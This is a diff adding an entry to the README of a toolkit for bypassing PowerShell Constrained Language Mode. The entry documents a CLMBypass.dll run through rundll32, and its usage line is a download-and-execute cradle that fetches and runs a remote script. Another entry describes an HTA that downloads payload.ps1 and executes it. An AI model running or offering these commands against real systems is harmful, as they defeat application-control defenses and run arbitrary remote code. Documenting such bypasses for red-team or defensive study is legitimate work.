@@ -8,6 +8,10 @@ Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https:
 
 <hr></hr>
 
+### CLMBypass.dll [A][C]
+- Using the DllExport library and properly formatted functions, it is possible to exeucte DLLs with `rundll32.exe` and .NET Framework support, which allows the use of `System.Managment.Automation`
+- **Usage:** `rundll32.exe CLMBypass.dll,Run IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1');`
+
 ### CLMBypass.hta [A][C]
 - The WScript.Shell creates a new runspace
 - `payload.ps1` is downloaded and executed in FullLanguage mode
